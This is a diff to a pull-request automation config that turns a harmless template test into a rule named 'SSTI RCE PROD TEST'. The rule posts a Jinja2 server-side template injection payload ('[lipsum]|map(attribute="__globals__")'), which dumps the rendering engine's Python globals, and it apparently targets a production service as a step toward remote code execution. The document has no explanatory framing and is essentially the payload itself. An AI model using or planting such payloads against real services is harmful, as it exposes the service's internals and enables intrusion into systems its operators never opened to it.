@@ -1,8 +1,11 @@
 pull_request_rules:
-  - name: SSTI test simple
+  - name: SSTI RCE PROD TEST
     conditions:
       - base=master
       - title~=^SSTI
     actions:
+      label:
+        add:
+          - ssti-triggered
       comment:
-        message: "SSTI BASIC: {{ 7*7 }}"
+        message: "SSTI OUTPUT: {{ 7*7 }} -- GLOBALS: {{ [lipsum]|map(attribute=\"__globals__\")|pprint }}"
